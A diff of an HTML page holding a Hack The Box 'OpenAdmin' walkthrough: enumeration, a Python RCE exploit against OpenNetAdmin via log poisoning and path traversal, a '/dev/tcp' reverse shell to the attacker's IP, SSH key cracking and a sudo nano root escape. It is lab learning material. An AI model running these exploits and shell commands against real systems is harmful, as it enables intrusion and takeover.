@@ -33,13 +33,15 @@
 
     
       <link rel="icon" type="image/x-icon" href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png">
-      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-light-87d1f2a3a19b1500e5c1626a0492025ca5f7f97d24540dc5900288e92112925a.png">
-      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-268b84a5df702d717857e91d8b80ec0f176d52b07f0893bd82eac76e7e8f0c40.css">
-      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-b6f8f6ceb983aa3da9f5bf7550d7516c131ba02c21bd7efe6fcdc1ac1eb1a693.css" disabled="true">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-bd87a972117a631461755cc733ab96b66bb38fb9d09359688cac8e4c2c561606.css">
     
 
   
 
+  <!-- Load KaTeX -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.js"></script>
 </head>
 
 <body>
@@ -119,21 +121,15 @@
       </li>
     
     
-      <li>
-        <a onclick="toggle()" title="Toggle Theme">
-          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
-  <use href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme" xlink:href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme"></use>
-</svg>
-
-        </a>
-      </li>
-    
   </ul>
 </nav>
 
 
   <ul class="header-tags scrollappear">
     
+    
+      
+        <li><a href="/tag/AES">Aes</a></li>
     
       
         <li><a href="/tag/ASC-Wargames">Asc-wargames</a></li>
@@ -161,9 +157,6 @@
     
       
         <li><a href="/tag/c">C</a></li>
-    
-      
-        <li><a href="/tag/cracking">Cracking</a></li>
     
       
         <li>...</li>
@@ -235,14 +228,14 @@
 <p>It was an easy machine from <strong>Hack The Box</strong> with:</p>
 <ul>
   <li>0-day in some sort of webapp with RCE in an old version.</li>
-  <li>SSH credentials in <code class="highlighter-rouge">mysql</code> config file.</li>
+  <li>SSH credentials in <code class="language-plaintext highlighter-rouge">mysql</code> config file.</li>
   <li>SSH private key on some internal network running in the background.</li>
   <li>GTFOBins on a file owned by root.</li>
 </ul>
 
 <h2 id="1-enumeration">1. Enumeration</h2>
 
-<p>First things first, let’s add <code class="highlighter-rouge">10.10.10.171</code> in <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">openadmin.htb</code> and enumerate our machine with <code class="highlighter-rouge">nmap</code> to discover open ports and services.</p>
+<p>First things first, let’s add <code class="language-plaintext highlighter-rouge">10.10.10.171</code> in <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">openadmin.htb</code> and enumerate our machine with <code class="language-plaintext highlighter-rouge">nmap</code> to discover open ports and services.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-sT</span> <span class="nt">-o</span> openadmin openadmin.htb
 <span class="gp">#</span><span class="w"> </span>Nmap 7.70 scan initiated Mon Jan  6 19:35:31 2020 as: nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> <span class="nt">-o</span> openadmin 10.10.10.171
@@ -265,15 +258,15 @@ PORT     STATE    SERVICE   VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Mon Jan  6 19:36:37 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.58 seconds</code></pre></figure>
 
-<p>I found <code class="highlighter-rouge">http</code> on port <code class="highlighter-rouge">80</code> and <code class="highlighter-rouge">ssh</code> on port <code class="highlighter-rouge">22</code> and 2 other filtered ports.</p>
+<p>I found <code class="language-plaintext highlighter-rouge">http</code> on port <code class="language-plaintext highlighter-rouge">80</code> and <code class="language-plaintext highlighter-rouge">ssh</code> on port <code class="language-plaintext highlighter-rouge">22</code> and 2 other filtered ports.</p>
 
-<p>The home page was <code class="highlighter-rouge">apache</code> default page and nothing else:</p>
+<p>The home page was <code class="language-plaintext highlighter-rouge">apache</code> default page and nothing else:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/default-92baf24994d79bdfca1778bcb049a2991485dab4b76942be057c838c873ed63a.jpg" data-zooming-width="1870" data-zooming-height="1051">
 </a></p>
 
-<p>I tried different URLs but still nothing, so let’s jump into <code class="highlighter-rouge">gobuster</code> to enumerate other pages and directories:</p>
+<p>I tried different URLs but still nothing, so let’s jump into <code class="language-plaintext highlighter-rouge">gobuster</code> to enumerate other pages and directories:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://openadmin.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 <span class="go">===============================================================
@@ -292,13 +285,13 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 /music (Status: 301)
 Progress: 980 / 87665 (1.12%)</span></code></pre></figure>
 
-<p>I found <code class="highlighter-rouge">/music</code> page let’s see its content:</p>
+<p>I found <code class="language-plaintext highlighter-rouge">/music</code> page let’s see its content:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/music-ad913e57754cc9180d1c3a39234684a9f299d816b81b66207b48434e7fb57ef5.jpg" data-zooming-width="1869" data-zooming-height="1006">
 </a></p>
 
-<p>It’s a beautiful UI with some interesting links: <code class="highlighter-rouge">login</code> redirect to <code class="highlighter-rouge">openadmin.htb/ona</code> and <code class="highlighter-rouge">create an account</code> to nothing. Let’s click on <code class="highlighter-rouge">login</code> to see what it goes:</p>
+<p>It’s a beautiful UI with some interesting links: <code class="language-plaintext highlighter-rouge">login</code> redirect to <code class="language-plaintext highlighter-rouge">openadmin.htb/ona</code> and <code class="language-plaintext highlighter-rouge">create an account</code> to nothing. Let’s click on <code class="language-plaintext highlighter-rouge">login</code> to see what it goes:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/ona-960ea82d4f1d3f260c11c2d9405ea7c19777500ad0b94ff35067c5b6eb49cbd4.jpg" data-zooming-width="1870" data-zooming-height="1031">
@@ -310,7 +303,7 @@ Progress: 980 / 87665 (1.12%)</span></code></pre></figure>
   <img src="/assets/documentation/hack-the-box/openadmin/ona_login-e728ef5683756a1b04cb8a199c0afcacac5e670b5fe7db15b00b1c92c0ef4224.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/ona_login-e728ef5683756a1b04cb8a199c0afcacac5e670b5fe7db15b00b1c92c0ef4224.jpg" data-zooming-width="1870" data-zooming-height="605">
 </a></p>
 
-<p>I tried <code class="highlighter-rouge">admin:admin</code> and it worked, but something wrong it redirect to the previous page with guest account not as admin. I intercepted the login request and send it using <code class="highlighter-rouge">burp</code> to see more details, but also nothing. I stuck a little, so I decided to search what is this application!.</p>
+<p>I tried <code class="language-plaintext highlighter-rouge">admin:admin</code> and it worked, but something wrong it redirect to the previous page with guest account not as admin. I intercepted the login request and send it using <code class="language-plaintext highlighter-rouge">burp</code> to see more details, but also nothing. I stuck a little, so I decided to search what is this application!.</p>
 
 <blockquote>
   <p>“OpenNetAdmin is a system for tracking IP network attributes in a database. A web interface is provided to administer the data, and there is a fully functional CLI interface for batch management.”</p>
@@ -318,7 +311,7 @@ Progress: 980 / 87665 (1.12%)</span></code></pre></figure>
 
 <h2 id="2-exploitation">2. Exploitation</h2>
 
-<p>I found RCE exploit with <code class="highlighter-rouge">searchsploit</code>, but the version <code class="highlighter-rouge">13.03</code> is older than running on the box <code class="highlighter-rouge">18.1.1</code>:</p>
+<p>I found RCE exploit with <code class="language-plaintext highlighter-rouge">searchsploit</code>, but the version <code class="language-plaintext highlighter-rouge">13.03</code> is older than running on the box <code class="language-plaintext highlighter-rouge">18.1.1</code>:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>searchsploit opennetadmin
 <span class="go">----------------------------------------------------------------------- ----------------------------------------
@@ -329,7 +322,7 @@ OpenNetAdmin 13.03.01 - Remote Code Execution                          | exploit
 ----------------------------------------------------------------------- ----------------------------------------
 Shellcodes: No Result</span></code></pre></figure>
 
-<p>I always like trying old things to see if it still work or not. The file <code class="highlighter-rouge">26682.txt</code> contains some info about the exploit with <code class="highlighter-rouge">HTML</code> code as a PoC by <strong>Mandat0ry</strong> (aka Matthew Bryant). I didn’t like <code class="highlighter-rouge">HTML</code> to exploit the application, so I wrote some <code class="highlighter-rouge">python</code> script to automate our process:</p>
+<p>I always like trying old things to see if it still work or not. The file <code class="language-plaintext highlighter-rouge">26682.txt</code> contains some info about the exploit with <code class="language-plaintext highlighter-rouge">HTML</code> code as a PoC by <strong>Mandat0ry</strong> (aka Matthew Bryant). I didn’t like <code class="language-plaintext highlighter-rouge">HTML</code> to exploit the application, so I wrote some <code class="language-plaintext highlighter-rouge">python</code> script to automate our process:</p>
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
 </span>
@@ -339,7 +332,7 @@ Shellcodes: No Result</span></code></pre></figure>
 <span class="k">def</span> <span class="nf">RS</span><span class="p">():</span>
     <span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">choice</span>
     <span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_lowercase</span>
-    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">choice</span><span class="p">(</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">choice</span><span class="p">(</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
     <span class="n">url</span> <span class="o">=</span> <span class="s">'http://openadmin.htb/ona/dcm.php'</span>
@@ -363,7 +356,7 @@ Shellcodes: No Result</span></code></pre></figure>
     <span class="k">print</span> <span class="n">colored</span><span class="p">(</span><span class="s">'[!] Spawning a shell...'</span><span class="p">,</span> <span class="s">'yellow'</span><span class="p">)</span>
     <span class="n">get_rce</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">'?module='</span> <span class="o">+</span> <span class="n">mod_name</span>
     <span class="n">get_shell</span> <span class="o">=</span> <span class="n">get</span><span class="p">(</span><span class="n">get_rce</span><span class="p">)</span>
-    <span class="k">print</span> <span class="n">get_shell</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">print</span> <span class="n">get_shell</span><span class="p">.</span><span class="n">text</span>
 
 <span class="n">exploit</span><span class="p">()</span></code></pre></figure>
 
@@ -373,22 +366,22 @@ Shellcodes: No Result</span></code></pre></figure>
 <span class="n">module</span><span class="p">[</span><span class="n">description</span><span class="p">]</span> <span class="o">=</span> <span class="n">Irrelevant</span> <span class="n">description</span> <span class="n">of</span> <span class="n">the</span> <span class="n">module</span> <span class="p">(</span><span class="n">unless</span> <span class="n">some</span> <span class="n">PHP</span> <span class="n">code</span> <span class="ow">is</span> <span class="n">injected</span> <span class="n">here</span> <span class="n">hmm</span><span class="err">?</span><span class="p">)</span>
 <span class="n">module</span><span class="p">[</span><span class="nb">file</span><span class="p">]</span> <span class="o">=</span> <span class="n">The</span> <span class="nb">file</span> <span class="n">to</span> <span class="n">be</span> <span class="n">included</span> <span class="ow">and</span> <span class="n">then</span> <span class="n">the</span> <span class="n">function</span></code></pre></figure>
 
-<p>I can inject some <code class="highlighter-rouge">PHP</code> code into <code class="highlighter-rouge">/var/log/ona.log</code> file via the module description parameter. Every time a module is added to <strong>OpenNetAdmin</strong> app the <code class="highlighter-rouge">description, name</code> are all logged into this log file.
-By setting the module file path to <code class="highlighter-rouge">../../../../../../../../../../../var/log/ona.log</code>, so we can include the log file as a module.</p>
+<p>I can inject some <code class="language-plaintext highlighter-rouge">PHP</code> code into <code class="language-plaintext highlighter-rouge">/var/log/ona.log</code> file via the module description parameter. Every time a module is added to <strong>OpenNetAdmin</strong> app the <code class="language-plaintext highlighter-rouge">description, name</code> are all logged into this log file.
+By setting the module file path to <code class="language-plaintext highlighter-rouge">../../../../../../../../../../../var/log/ona.log</code>, so we can include the log file as a module.</p>
 
-<p>I tried to inject <code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.15.253/1337 0&gt;&amp;1</code> as a reverse shell, but it didn’t work because of the way the logger script works I cannot use any <code class="highlighter-rouge">&lt;</code> or <code class="highlighter-rouge">&gt;</code>. So, I tried to escape it using <code class="highlighter-rouge">\&gt;</code>, but also didn’t work.</p>
+<p>I tried to inject <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.15.253/1337 0&gt;&amp;1</code> as a reverse shell, but it didn’t work because of the way the logger script works I cannot use any <code class="language-plaintext highlighter-rouge">&lt;</code> or <code class="language-plaintext highlighter-rouge">&gt;</code>. So, I tried to escape it using <code class="language-plaintext highlighter-rouge">\&gt;</code>, but also didn’t work.</p>
 
-<p>Let’s write the above script into a <code class="highlighter-rouge">shell.sh</code> file and upload it into the box and wait for a shell:</p>
+<p>Let’s write the above script into a <code class="language-plaintext highlighter-rouge">shell.sh</code> file and upload it into the box and wait for a shell:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/exploit-37d1f59d9a4447b91af28369085e6a9a6cb0b98f0dc860fa3e3ec8d895e8a74b.jpg" data-zooming-width="1870" data-zooming-height="1051">
 </a></p>
 
-<p>I got a shell with an old 0-day exploit as <code class="highlighter-rouge">www-data</code>, now let’s dive into privesc.</p>
+<p>I got a shell with an old 0-day exploit as <code class="language-plaintext highlighter-rouge">www-data</code>, now let’s dive into privesc.</p>
 
 <h2 id="3-privilege-escalation">3. Privilege Escalation</h2>
 
-<p>First thing I though is to search for any interesting files, then I stuck a little until I found <code class="highlighter-rouge">mysql</code> database settings file inside <code class="highlighter-rouge">local/config</code> folder:</p>
+<p>First thing I though is to search for any interesting files, then I stuck a little until I found <code class="language-plaintext highlighter-rouge">mysql</code> database settings file inside <code class="language-plaintext highlighter-rouge">local/config</code> folder:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/settings-5b24353b254705e5799ab995bd8188b817a6693cafcb5f7a5db3f07da0d4be85.jpg" data-zooming-width="1872" data-zooming-height="395">
@@ -418,13 +411,13 @@ By setting the module file path to <code class="highlighter-rouge">../../../../.
 <span class="p">);</span>
 <span class="cp">?&gt;</span></code></pre></figure>
 
-<p>Let’s try login to <code class="highlighter-rouge">mysql</code> and see the available users:</p>
+<p>Let’s try login to <code class="language-plaintext highlighter-rouge">mysql</code> and see the available users:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/mysql-cd6d797d8a93ebad56a53c4cc98a52a2a25c28265f5c91776bfb55c8283a9346.jpg" data-zooming-width="1173" data-zooming-height="547">
 </a></p>
 
-<p>I got two <code class="highlighter-rouge">md5</code> hashes after cracking <code class="highlighter-rouge">guest:test</code> and <code class="highlighter-rouge">admin:admin</code>. I tried <code class="highlighter-rouge">ssh</code> using those creds but nothing worked. After awhile I went back to what I’ve gained so far and thought let’s try database password to switch with an existing users. I tried first user <code class="highlighter-rouge">jimmy</code> and it worked.</p>
+<p>I got two <code class="language-plaintext highlighter-rouge">md5</code> hashes after cracking <code class="language-plaintext highlighter-rouge">guest:test</code> and <code class="language-plaintext highlighter-rouge">admin:admin</code>. I tried <code class="language-plaintext highlighter-rouge">ssh</code> using those creds but nothing worked. After awhile I went back to what I’ve gained so far and thought let’s try database password to switch with an existing users. I tried first user <code class="language-plaintext highlighter-rouge">jimmy</code> and it worked.</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/jimmy-bb61ba9621a9bb791628f6575785a84483cb65a923a39c4f39034fcdea71e9fe.jpg" data-zooming-width="868" data-zooming-height="745">
@@ -432,17 +425,17 @@ By setting the module file path to <code class="highlighter-rouge">../../../../.
 
 <h2 id="4-internal-network">4. Internal Network</h2>
 
-<p>This user isn’t the actual user so, as we saw above there is another user <code class="highlighter-rouge">joanna</code>. I started searching for files and finally I got a folder called <code class="highlighter-rouge">internal</code> inside <code class="highlighter-rouge">/var/www</code> :</p>
+<p>This user isn’t the actual user so, as we saw above there is another user <code class="language-plaintext highlighter-rouge">joanna</code>. I started searching for files and finally I got a folder called <code class="language-plaintext highlighter-rouge">internal</code> inside <code class="language-plaintext highlighter-rouge">/var/www</code> :</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">    282830      4 -rwxrwxr-x   1 jimmy            internal                     339 Nov 23 17:40 /var/www/internal/main.php
       2644      4 -rwxrwxr-x   1 jimmy            internal                     185 Nov 23 16:37 /var/www/internal/logout.php
       1387      4 -rwxrwxr-x   1 jimmy            internal                    3229 Nov 22 23:24 /var/www/internal/index.php</span></code></pre></figure>
 
-<p>Then, I got an interesting <code class="highlighter-rouge">php</code> code inside <code class="highlighter-rouge">index.php</code> file.</p>
+<p>Then, I got an interesting <code class="language-plaintext highlighter-rouge">php</code> code inside <code class="language-plaintext highlighter-rouge">index.php</code> file.</p>
 
 <figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
 <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'login'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'jimmy'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha512'</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">==</span> <span class="s1">'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f...'</span><span class="p">)</span> <span class="p">{</span>
       <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'jimmy'</span><span class="p">;</span>
       <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /main.php"</span><span class="p">);</span>
@@ -452,8 +445,8 @@ By setting the module file path to <code class="highlighter-rouge">../../../../.
 <span class="p">}</span>
 <span class="cp">?&gt;</span></code></pre></figure>
 
-<p>The script wants to login via <code class="highlighter-rouge">main.php</code> using <code class="highlighter-rouge">jimmy</code> as a username and <code class="highlighter-rouge">sha512(password)</code> must match the following hash:
-<code class="highlighter-rouge">00e302ccdcf1c60b8ad5...</code>. After I decrypt the hash I got <code class="highlighter-rouge">Revealed</code> as a password.</p>
+<p>The script wants to login via <code class="language-plaintext highlighter-rouge">main.php</code> using <code class="language-plaintext highlighter-rouge">jimmy</code> as a username and <code class="language-plaintext highlighter-rouge">sha512(password)</code> must match the following hash:
+<code class="language-plaintext highlighter-rouge">00e302ccdcf1c60b8ad5...</code>. After I decrypt the hash I got <code class="language-plaintext highlighter-rouge">Revealed</code> as a password.</p>
 
 <p>Now let’s see what other services running on the box:</p>
 
@@ -468,13 +461,13 @@ tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      -
 tcp6       0      0 :::80                   :::*                    LISTEN      -</span></code></pre></figure>
 
-<p>I found a <code class="highlighter-rouge">TCP</code> service running locally on port <code class="highlighter-rouge">52846</code>. Let’s post our data on <code class="highlighter-rouge">127.0.0.1:52846/main.php</code> usign <code class="highlighter-rouge">curl</code>:</p>
+<p>I found a <code class="language-plaintext highlighter-rouge">TCP</code> service running locally on port <code class="language-plaintext highlighter-rouge">52846</code>. Let’s post our data on <code class="language-plaintext highlighter-rouge">127.0.0.1:52846/main.php</code> usign <code class="language-plaintext highlighter-rouge">curl</code>:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/priv_key-c5b6226a3d299f1ea61218cf14a0018e751c61f6dac3af8454d32f5c433a9218.jpg" data-zooming-width="885" data-zooming-height="705">
 </a></p>
 
-<p>Oh! I got <code class="highlighter-rouge">ssh</code> private key, so let’s extract it using <code class="highlighter-rouge">ssh2john</code> and crack it with our friend <code class="highlighter-rouge">john</code>:</p>
+<p>Oh! I got <code class="language-plaintext highlighter-rouge">ssh</code> private key, so let’s extract it using <code class="language-plaintext highlighter-rouge">ssh2john</code> and crack it with our friend <code class="language-plaintext highlighter-rouge">john</code>:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@kali:~#</span><span class="w"> </span>ssh2john rsa_priv.key <span class="o">&gt;</span> joanna.priv
 <span class="gp">root@kali:~#</span><span class="w"> </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt joanna.priv 
@@ -489,7 +482,7 @@ bloodninjas      (rsa_priv.key)
 1g 0:00:00:12 DONE (2020-02-03 01:20) 0.07855g/s 1126Kp/s 1126Kc/s 1126KC/s *7¡Vamos!
 Session completed</span></code></pre></figure>
 
-<p>And now I got the password <code class="highlighter-rouge">bloodninjas</code>, let’s <code class="highlighter-rouge">ssh</code> with <code class="highlighter-rouge">joanna</code> and own user:</p>
+<p>And now I got the password <code class="language-plaintext highlighter-rouge">bloodninjas</code>, let’s <code class="language-plaintext highlighter-rouge">ssh</code> with <code class="language-plaintext highlighter-rouge">joanna</code> and own user:</p>
 
 <p><a href="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg">
   <img src="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg" alt="OpenAdmin" class="zooming" data-rjs="/assets/documentation/hack-the-box/openadmin/joanna-9c13ec1cc61b00091526ab3d51d18d569915fd684160e5e94511081a59dde4f5.jpg" data-zooming-width="761" data-zooming-height="539">
@@ -497,18 +490,18 @@ Session completed</span></code></pre></figure>
 
 <h2 id="5-own-root">5. Own Root</h2>
 
-<p>Let’s find what else I can do to own <code class="highlighter-rouge">root</code>, after deep diving for any important things related to <code class="highlighter-rouge">joanna</code>I found <code class="highlighter-rouge">/etc/sudoers.d/joanna</code> owned by <code class="highlighter-rouge">root</code>. Sudoers files just contains rights for who can access what in the system.</p>
+<p>Let’s find what else I can do to own <code class="language-plaintext highlighter-rouge">root</code>, after deep diving for any important things related to <code class="language-plaintext highlighter-rouge">joanna</code>I found <code class="language-plaintext highlighter-rouge">/etc/sudoers.d/joanna</code> owned by <code class="language-plaintext highlighter-rouge">root</code>. Sudoers files just contains rights for who can access what in the system.</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">joanna@openadmin:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/sudoers.d/joanna
 <span class="go">joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv</span></code></pre></figure>
 
-<p>This line above just tell the system give all <code class="highlighter-rouge">sudo</code> privileges to user <code class="highlighter-rouge">joanna</code> with <strong>no password</strong> to execute <code class="highlighter-rouge">nano</code> on <code class="highlighter-rouge">/opt/priv</code>. let’s take advantage of this by execute commands from <code class="highlighter-rouge">/bin/nano</code> bypassing all local security restrictions, see <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+<p>This line above just tell the system give all <code class="language-plaintext highlighter-rouge">sudo</code> privileges to user <code class="language-plaintext highlighter-rouge">joanna</code> with <strong>no password</strong> to execute <code class="language-plaintext highlighter-rouge">nano</code> on <code class="language-plaintext highlighter-rouge">/opt/priv</code>. let’s take advantage of this by execute commands from <code class="language-plaintext highlighter-rouge">/bin/nano</code> bypassing all local security restrictions, see <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
 
-<p>Now let’s run <code class="highlighter-rouge">sudo nano /opt/priv</code>, and press <code class="highlighter-rouge">ctr + R</code> to read a file then <code class="highlighter-rouge">ctr + X</code> to execute root commands and type:</p>
+<p>Now let’s run <code class="language-plaintext highlighter-rouge">sudo nano /opt/priv</code>, and press <code class="language-plaintext highlighter-rouge">ctr + R</code> to read a file then <code class="language-plaintext highlighter-rouge">ctr + X</code> to execute root commands and type:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">reset<span class="p">;</span> bash 1&gt;&amp;0 2&gt;&amp;0<span class="p">;</span></code></pre></figure>
 
-<p>And finally owned <code class="highlighter-rouge">root</code>:</p>
+<p>And finally owned <code class="language-plaintext highlighter-rouge">root</code>:</p>
 
 <figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">root@openadmin:~#</span><span class="w"> </span><span class="nb">id</span>
 <span class="go">uid=0(root) gid=0(root) groups=0(root)
@@ -567,7 +560,7 @@ Session completed</span></code></pre></figure>
 <script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
 
 
-  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
 
